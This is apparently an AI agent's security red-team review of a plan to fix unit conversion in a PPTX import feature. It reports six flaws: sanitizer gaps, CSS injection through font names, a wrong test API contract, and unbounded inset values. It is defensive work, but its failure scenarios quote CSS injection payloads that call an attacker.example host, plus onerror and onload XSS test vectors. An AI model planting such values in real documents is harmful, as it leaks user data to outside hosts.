## Finding 1: Client fallback widens CSS trust boundary without server sanitizer parity
- Severity: High
- Location: Phase 1, "Step 4 - Wire backward compat for already-imported HTML" and "Security Considerations"
- Flaw: Plan says client `sanitizeRichTextHtml` should apply the same conversion on read, while also claiming DOMPurify still runs first and CSS allowlist/protocol guards are not relaxed. That is factually false for the client path: current client/shared sanitizer is regex-only and does not filter `style` declarations, `url(...)`, `@import`, `expression`, `behavior`, or non-allowlisted CSS properties.
- Failure scenario: A legacy/imported presentation contains rich text with `style="background:url(https://attacker.example/pixel?deck=...);font-size:24pt"`. Phase 1 routes this through client read-time conversion, but without porting server `sanitizeStyle`; the browser can still perform external fetches from rendered content. This crosses the README trust-boundary warning for untrusted imported files.
- Evidence:
  - `plans/260525-1450-pptx-import-unit-conversion-and-scale-fixes/phase-01-sanitizer-pt-to-px-conversion.md:194` proposes client `sanitizeRichTextHtml` conversion on read.
  - `plans/260525-1450-pptx-import-unit-conversion-and-scale-fixes/phase-01-sanitizer-pt-to-px-conversion.md:245-246` claims DOMPurify and CSS allowlist/protocol guards still apply.
  - `server/services/pptx-import/sanitize.js:31-35` server-side sanitizer explicitly rejects non-allowlisted style props, dangerous CSS keywords, and `url(...)`.
  - `shared/src/content-safety.js:21-24` client/shared `sanitizeRichTextHtml` only strips `<script>`, event attrs, and URL attributes; it does not inspect style declarations.
  - `client/src/components/canvas/canvas-element-wrapper.jsx:112-113` renders text via `dangerouslySetInnerHTML` after `sanitizeRichTextHtml`.
- Suggested fix: Do not add conversion-only logic to client sanitizer. Extract a shared rich-text sanitizer that preserves server semantics: DOMPurify-equivalent tag/attr allowlist plus `sanitizeStyle` property/value filtering plus unit conversion. Add tests proving `style="background:url(...)"`, `@import`, `expression`, `behavior`, and non-allowlisted properties are removed in both server import and client legacy-render paths.

## Finding 2: Shape `textHtml` plan introduces a new HTML execution surface but trusts stored data
- Severity: High
- Location: Phase 6, "Requirements", "Step 3 - renderer honors `textHtml`", and "Security Considerations"
- Flaw: Plan explicitly says `textHtml` does not need renderer re-sanitization and that server export renderer can trust stored values. That is unsafe because `textHtml` becomes a new render surface for shape elements, current shape renderer only renders escaped/plain SVG text, and existing shared sanitizer is not DOMPurify-equivalent.
- Failure scenario: A presentation JSON, imported deck, or future editor mutation stores a shape with `textHtml` containing an unsafe style or non-script active content missed by regex sanitizer. Phase 6 then renders it into editor/offline export as HTML, whereas current code only places `element.text` as React text inside SVG. Result: a new trust-boundary expansion from plain text to HTML without a hard sanitizer contract.
- Evidence:
  - `plans/260525-1450-pptx-import-unit-conversion-and-scale-fixes/phase-06-shape-rich-text-preservation-and-multi-run-metadata.md:42` says renderer does not need to re-sanitize.
  - `plans/260525-1450-pptx-import-unit-conversion-and-scale-fixes/phase-06-shape-rich-text-preservation-and-multi-run-metadata.md:156-157` uses `element.textHtml` as-is in shared renderer.
  - `plans/260525-1450-pptx-import-unit-conversion-and-scale-fixes/phase-06-shape-rich-text-preservation-and-multi-run-metadata.md:208` says server export renderer trusts stored value.
  - Current client shape renderer renders `element.text` as a React text child, not HTML: `client/src/components/canvas/element-renderers/shape-element-renderer.jsx:113-123`.
  - Current server/shared shape renderer delegates to `shapeSvgString(el)` rather than injecting `textHtml`: `shared/src/element-renderers.js:148-150`.
  - `shared/src/content-safety.js:21-24` is not DOMPurify; it does not enforce the server `SAFE_STYLE_PROPS` or CSS URL guards.
- Suggested fix: Treat shape `textHtml` as untrusted at every render boundary. Client and shared renderer must call the same strict sanitizer used by import, including style allowlist and CSS URL blocking. Add tests with `<img onerror>`, `<svg/onload>`, `style="background:url(...)"`, and malformed attributes. Do not document "trusted stored value" as a security control.

## Finding 3: Table `fontFamily` sanitization is CSS injection-prone
- Severity: High
- Location: Phase 5, "Architecture", "Step 3 - update renderers", and "Security Considerations"
- Flaw: Plan claims `normalizeFontFamily` is sufficient because it strips quotes and takes the first comma-delimited family. The actual helper does not reject semicolons, parentheses, `url(...)`, CSS comments, or control characters. The plan then interpolates that string directly into inline CSS as `font-family: ${fontFamily}`.
- Failure scenario: A malicious PPTX cell sets `fontFace` to `Arial; background:url(https://attacker.example/leak)`. `normalizeFontFamily` returns that string mostly intact. Phase 5 renderer emits it into `<td style="...font-family: Arial; background:url(...)">`, triggering external network fetches or style injection in exported HTML/editor rendering.
- Evidence:
  - `plans/260525-1450-pptx-import-unit-conversion-and-scale-fixes/phase-05-table-fontsize-and-fontfamily-fidelity.md:142` says populate `fontFamilies` from `cell.fontFace`.
  - `plans/260525-1450-pptx-import-unit-conversion-and-scale-fixes/phase-05-table-fontsize-and-fontfamily-fidelity.md:150-153` interpolates `fontFamily` directly into inline CSS.
  - `plans/260525-1450-pptx-import-unit-conversion-and-scale-fixes/phase-05-table-fontsize-and-fontfamily-fidelity.md:198-199` claims `normalizeFontFamily` and a safe property whitelist make this safe.
  - Actual `normalizeFontFamily` only splits on comma, strips quotes, trims: `server/services/pptx-import/mapper/utils-text.js:14-19`.
  - Existing shared text renderer already interpolates `el.fontFamily` directly into a style string: `shared/src/element-renderers.js:104-108`.
  - Current table renderer uses React style object for fixed `fontSize` but has no per-cell font-family validation path yet: `client/src/components/canvas/element-renderers/table-element-renderer.jsx:102-112`.
- Suggested fix: Replace `normalizeFontFamily` with a strict CSS identifier/family validator. Allow only safe family tokens like `[\w -]+` plus a small generic-family allowlist, reject `;`, `:`, `(`, `)`, `/`, `\`, control chars, and `url/import/expression`. In shared HTML renderers, escape style values or construct styles through a vetted serializer.

## Finding 4: Visual fidelity gate targets the wrong API contract and will not exercise import
- Severity: Medium
- Location: Phase 8, "Visual regression spec"
- Flaw: Plan's Playwright sample posts to `/api/pptx-import` and expects `{ id }` immediately. Actual production API is `/api/pptx/import`, returns `202 { jobId }`, and requires polling `/api/pptx/jobs/:jobId` for the import result. The proposed gate can fail trivially or, worse, be patched locally to a fake helper while never covering the real async import/job path.
- Failure scenario: A security regression in upload validation, parser worker handling, job cancellation, or result serialization ships because the visual gate bypasses the real endpoint contract. The plan's final acceptance signal is false: it never proves the same route used by users can import a PPTX and render the result.
- Evidence:
  - Plan posts to `/api/pptx-import` and reads `{ id }`: `plans/260525-1450-pptx-import-unit-conversion-and-scale-fixes/phase-08-acceptance-gate-corpus-visual-regression-and-rollout.md:112-116`.
  - Actual route is mounted at `/api/pptx`: `server/index.js:115-116`.
  - Actual import endpoint is `POST /import` under that router and returns `202 { jobId }`: `server/routes/pptx-import.js:87-102`.
  - Actual job result is retrieved from `/jobs/:jobId`: `server/routes/pptx-import.js:112-116`.
  - Existing E2E uses the real route `/api/pptx/import`: `tests/e2e/pptx-import-fidelity.spec.js:37`.
- Suggested fix: Rewrite Phase 8 spec around the real async contract: `POST /api/pptx/import`, poll `/api/pptx/jobs/:jobId` until `status === "done"`, extract the presentation id from `job.result`, then navigate. Include negative tests for invalid extension/oversized package if acceptance gate is also claiming import hardening coverage.

## Finding 5: Raw-unit acceptance scan misses the actual inline CSS leak it is meant to catch
- Severity: Medium
- Location: Phase 8, "Acceptance criteria module"
- Flaw: Plan says `assertNoRawPtStrings` should walk fields and assert no string ending in `pt`, `in`, or `cm`. The current raw-unit leak lives inside HTML style attributes stored in `element.content`/`textHtml`, where the full string ends with markup, not with the unit. This leaves the headline bug class undetected.
- Failure scenario: A future change reintroduces `<span style="font-size:24pt">Title</span>` in `element.content`. The proposed scan sees a string ending in `</span>`, not `pt`, so the acceptance gate passes. Browser then converts `pt -> px` again, reproducing the overflow bug and any CSS unit trust-boundary mistakes.
- Evidence:
  - Plan's assertion scans strings "ending in" units: `plans/260525-1450-pptx-import-unit-conversion-and-scale-fixes/phase-08-acceptance-gate-corpus-visual-regression-and-rollout.md:84-86`.
  - Text importer stores sanitized HTML as `content`: `server/services/pptx-import/mapper/map-presentation.js:39-46`.
  - Shape importer stores sanitized rich HTML as `textHtml`: `server/services/pptx-import/mapper/map-shape.js:48-61`.
  - Client renders text `content` as HTML: `client/src/components/canvas/canvas-element-wrapper.jsx:112-113`.
  - Server sanitizer currently allows `font-size`/`letter-spacing` style properties where raw units can appear: `server/services/pptx-import/sanitize.js:6-18`.
- Suggested fix: Acceptance criteria must parse/sanitize HTML style attributes, not only check string suffixes. Add assertions over every style declaration in `content`, `textHtml`, notes, and table cell style fields: no CSS length unit from `{pt,in,cm,mm}` remains for properties normalized by the importer, and no `url(...)`/dangerous CSS tokens survive.

## Finding 6: Text inset conversion has no upper bound, enabling layout/resource exhaustion
- Severity: Medium
- Location: Phase 7, "Extractor change" and "Client renderer"
- Flaw: Plan converts PPTX inset values to `padding` with `Math.max(0, ...)` but no upper bound. Current numeric helpers also have no max clamp. A malicious but small PPTX can set enormous inset numbers that become enormous CSS padding values, causing browser layout/export memory and rendering work amplification.
- Failure scenario: Attacker uploads a PPTX with `insetLeft: 1e12`. Import succeeds because ZIP/file guards only cap archive size and entry counts. Phase 7 stores `padding.left` as a huge px value; the editor and Playwright/export renderers then attempt layout with extreme dimensions, potentially hanging the browser process or making visual regression/export unreliable.
- Evidence:
  - Phase 7 proposed `toPx` uses only `Math.max(0, ...)`, no max: `plans/260525-1450-pptx-import-unit-conversion-and-scale-fixes/phase-07-text-insets-application-on-client.md:70-75`.
  - Existing `readNumber` supports a min fallback but no maximum: `server/services/pptx-import/geometry.js:3-8`.
  - Current package guards limit bytes/entries, not numeric field magnitude: `server/services/pptx-import/pptx-guards.js:23-76`.
  - Canvas text renderer applies inline style directly to the rendered content wrapper: `client/src/components/canvas/canvas-element-wrapper.jsx:86` and `client/src/components/canvas/canvas-element-wrapper.jsx:112-113`.
- Suggested fix: Clamp all imported numeric layout fields to sane canvas-relative bounds. For padding/insets, cap each side to `min(element.width/2, 96)` or another documented canvas-px maximum. Add adversarial tests for `Infinity`, `NaN`, exponent strings, negative values, and very large numbers across text/shape/table fields.

**Status:** DONE
**Summary:** Red-team plan review complete. Found 6 security/migration-gate flaws backed by codebase citations: weak client sanitizer parity, new shape HTML trust surface, CSS injection through fontFamily, wrong import API contract in visual gate, incomplete raw-unit acceptance scan, and unbounded inset layout values.
**Concerns/Blockers:** Không chạy lint/build/test theo yêu cầu. Một số plan assertions contradict actual code (`sanitizeRichTextHtml` is not DOMPurify; import API is async job-based).
